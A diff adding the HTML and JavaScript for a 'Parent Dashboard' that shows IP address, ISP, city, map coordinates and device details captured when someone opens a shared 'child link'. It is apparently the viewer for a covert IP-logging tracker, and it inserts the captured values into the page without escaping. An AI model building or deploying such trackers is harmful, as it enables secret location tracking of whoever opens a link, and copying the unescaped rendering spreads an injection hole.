@@ -1,0 +1,346 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Parent Dashboard</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+
+    body {
+      font-family: 'Segoe UI', sans-serif;
+      background: #f0f2f5;
+      color: #1a1a2e;
+    }
+
+    /* ── Header ── */
+    header {
+      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+      color: white;
+      padding: 1.25rem 2rem;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      flex-wrap: wrap;
+      gap: 1rem;
+    }
+
+    header h1 { font-size: 20px; font-weight: 700; }
+    header p  { font-size: 13px; opacity: 0.8; }
+
+    .header-btns { display: flex; gap: 8px; }
+
+    .btn {
+      padding: 8px 18px;
+      border-radius: 8px;
+      cursor: pointer;
+      font-size: 14px;
+      font-weight: 500;
+      border: none;
+    }
+
+    .btn-white {
+      background: rgba(255,255,255,0.2);
+      border: 1px solid rgba(255,255,255,0.4);
+      color: white;
+    }
+
+    .btn-white:hover { background: rgba(255,255,255,0.35); }
+
+    .btn-red {
+      background: rgba(239,68,68,0.25);
+      border: 1px solid rgba(239,68,68,0.5);
+      color: #fff;
+    }
+
+    .btn-red:hover { background: rgba(239,68,68,0.45); }
+
+    /* ── Main container ── */
+    .container { max-width: 960px; margin: 2rem auto; padding: 0 1.5rem; }
+
+    /* ── Summary count bar ── */
+    .summary {
+      background: #fff;
+      border-radius: 12px;
+      padding: 1rem 1.5rem;
+      margin-bottom: 1.5rem;
+      border: 1px solid #e0e0e0;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      flex-wrap: wrap;
+      gap: 1rem;
+    }
+
+    .summary-left { display: flex; align-items: center; gap: 12px; }
+
+    .live-dot {
+      width: 12px; height: 12px;
+      border-radius: 50%;
+      background: #22c55e;
+      animation: pulse 2s infinite;
+    }
+
+    @keyframes pulse {
+      0%, 100% { box-shadow: 0 0 0 0 rgba(34,197,94,0.4); }
+      50%       { box-shadow: 0 0 0 6px rgba(34,197,94,0); }
+    }
+
+    .count-badge {
+      background: #667eea;
+      color: white;
+      font-size: 12px;
+      font-weight: 700;
+      padding: 3px 10px;
+      border-radius: 20px;
+    }
+
+    /* ── Record cards ── */
+    .record {
+      background: #fff;
+      border-radius: 16px;
+      border: 1px solid #e0e0e0;
+      margin-bottom: 1.5rem;
+      overflow: hidden;
+    }
+
+    .record-header {
+      background: linear-gradient(135deg, #667eea22, #764ba222);
+      border-bottom: 1px solid #e0e0e0;
+      padding: 1rem 1.5rem;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      flex-wrap: wrap;
+      gap: 0.5rem;
+    }
+
+    .record-title { font-size: 15px; font-weight: 700; color: #667eea; }
+    .record-time  { font-size: 13px; color: #888; }
+
+    .grid-2 {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 0;
+    }
+
+    @media (max-width: 600px) { .grid-2 { grid-template-columns: 1fr; } }
+
+    .section { border-right: 1px solid #f0f0f0; }
+    .section:last-child { border-right: none; }
+
+    .section-title {
+      background: #f8f9ff;
+      padding: 0.7rem 1.25rem;
+      font-size: 12px;
+      font-weight: 700;
+      color: #667eea;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+      border-bottom: 1px solid #f0f0f0;
+    }
+
+    .row {
+      display: flex;
+      justify-content: space-between;
+      padding: 10px 1.25rem;
+      border-bottom: 1px solid #f8f8f8;
+      font-size: 13px;
+      gap: 8px;
+    }
+
+    .row:last-child { border-bottom: none; }
+
+    .row-lbl { color: #888; white-space: nowrap; }
+
+    .row-val {
+      font-weight: 600;
+      text-align: right;
+      word-break: break-all;
+      color: #1a1a2e;
+    }
+
+    .maps-link {
+      color: #667eea;
+      text-decoration: none;
+      font-weight: 600;
+    }
+
+    .maps-link:hover { text-decoration: underline; }
+
+    /* ── States ── */
+    .empty {
+      text-align: center;
+      padding: 4rem 2rem;
+      color: #aaa;
+    }
+
+    .empty-icon { font-size: 48px; margin-bottom: 1rem; }
+    .empty h2  { font-size: 18px; color: #666; margin-bottom: 0.5rem; }
+    .empty p   { font-size: 14px; }
+
+    .error-box {
+      background: #fff3f3;
+      border: 1px solid #fca5a5;
+      border-radius: 10px;
+      padding: 1rem 1.5rem;
+      color: #b91c1c;
+      font-size: 14px;
+      margin-bottom: 1rem;
+    }
+
+    .refreshed {
+      font-size: 12px;
+      color: #aaa;
+      text-align: center;
+      margin-top: 1rem;
+      margin-bottom: 2rem;
+    }
+  </style>
+</head>
+<body>
+
+<header>
+  <div>
+    <h1>Parent Dashboard</h1>
+    <p>Child location &amp; device tracker</p>
+  </div>
+  <div class="header-btns">
+    <button class="btn btn-white" onclick="loadData()">Refresh</button>
+    <button class="btn btn-red"   onclick="clearData()">Clear All</button>
+  </div>
+</header>
+
+<div class="container">
+
+  <div class="summary">
+    <div class="summary-left">
+      <div class="live-dot"></div>
+      <div>
+        <div style="font-weight:600;font-size:15px" id="summary-title">Loading data...</div>
+        <div style="font-size:13px;color:#888" id="summary-sub">Auto-refreshes every 15 seconds</div>
+      </div>
+    </div>
+    <span class="count-badge" id="count-badge">0 records</span>
+  </div>
+
+  <div id="error-box" class="error-box" style="display:none"></div>
+  <div id="records-container"></div>
+  <div class="refreshed" id="refreshed-text"></div>
+
+</div>
+
+<script>
+  // ─── Configuration ─────────────────────────────────────────────────────────
+  const SERVER_URL = window.location.origin;  // Auto-detects — works on localhost + Render
+  // ───────────────────────────────────────────────────────────────────────────
+
+  function row(label, value) {
+    return `<div class="row">
+              <span class="row-lbl">${label}</span>
+              <span class="row-val">${value || "N/A"}</span>
+            </div>`;
+  }
+
+  function buildRecord(d, index) {
+    const mapsHref = (d.latitude && d.latitude !== "N/A")
+      ? `https://maps.google.com/?q=${d.latitude},${d.longitude}`
+      : "#";
+
+    const mapsVal = (d.latitude && d.latitude !== "N/A")
+      ? `<a class="maps-link" href="${mapsHref}" target="_blank">${d.latitude}, ${d.longitude} — Open Map</a>`
+      : "N/A";
+
+    return `
+    <div class="record">
+      <div class="record-header">
+        <span class="record-title">Record #${index + 1} — ${d.city || "Unknown City"}, ${d.country || "Unknown Country"}</span>
+        <span class="record-time">${d.server_received_time || d.time_opened || ""}</span>
+      </div>
+
+      <div class="grid-2">
+        <div class="section">
+          <div class="section-title">Network Info</div>
+          ${row("IP Address",   d.ip_address)}
+          ${row("ISP / Carrier", d.isp_name)}
+          ${row("ASN",           d.asn)}
+          ${row("Country",       d.country + (d.country_code ? " (" + d.country_code + ")" : ""))}
+          ${row("Region / State", d.region)}
+          ${row("City",          d.city)}
+          ${row("Postal Code",   d.postal_code)}
+          ${row("Timezone (IP)", d.ip_timezone)}
+        </div>
+
+        <div class="section">
+          <div class="section-title">Device Info</div>
+          ${row("Browser",         d.browser)}
+          ${row("Operating System", d.os)}
+          ${row("Device Type",      d.device_type)}
+          ${row("Screen Size",      d.screen)}
+          ${row("Language",         d.language)}
+          ${row("Local Timezone",   d.timezone_local)}
+          ${row("Cookies Enabled",  d.cookies_enabled ? "Yes" : "No")}
+          ${row("Time Link Opened", d.time_opened)}
+        </div>
+      </div>
+
+      <div style="border-top:1px solid #f0f0f0">
+        <div class="section-title">Approximate Location (from IP)</div>
+        <div class="row">
+          <span class="row-lbl">Coordinates</span>
+          <span class="row-val">${mapsVal}</span>
+        </div>
+      </div>
+    </div>`;
+  }
+
+  async function loadData() {
+    try {
+      const res     = await fetch(`${SERVER_URL}/data`);
+      const records = await res.json();
+
+      document.getElementById("error-box").style.display = "none";
+      document.getElementById("count-badge").textContent  = records.length + " record" + (records.length !== 1 ? "s" : "");
+
+      if (records.length === 0) {
+        document.getElementById("summary-title").textContent = "Waiting for child to open link...";
+        document.getElementById("summary-sub").textContent   = "Share the child link. Data appears here automatically.";
+        document.getElementById("records-container").innerHTML = `
+          <div class="empty">
+            <div class="empty-icon">📡</div>
+            <h2>No data yet</h2>
+            <p>Send the child link. When opened, all data will appear here instantly.</p>
+          </div>`;
+      } else {
+        document.getElementById("summary-title").textContent = "Data received — child link was opened!";
+        document.getElementById("summary-sub").textContent   = "Showing " + records.length + " session(s). Latest first.";
+        document.getElementById("records-container").innerHTML = records.map(buildRecord).join("");
+      }
+
+      document.getElementById("refreshed-text").textContent =
+        "Last refreshed: " + new Date().toLocaleString("en-IN", { timeZone: "Asia/Kolkata" });
+
+    } catch (err) {
+      document.getElementById("error-box").style.display = "block";
+      document.getElementById("error-box").textContent   =
+        "Cannot connect to Python server. Make sure app.py is running. Error: " + err.message;
+    }
+  }
+
+  async function clearData() {
+    if (!confirm("Delete all tracking records?")) return;
+    try {
+      await fetch(`${SERVER_URL}/clear`, { method: "DELETE" });
+      loadData();
+    } catch (e) {
+      alert("Error clearing data: " + e.message);
+    }
+  }
+
+  // Load immediately, then every 15 seconds
+  loadData();
+  setInterval(loadData, 15000);
+</script>
+
+</body>
+</html>
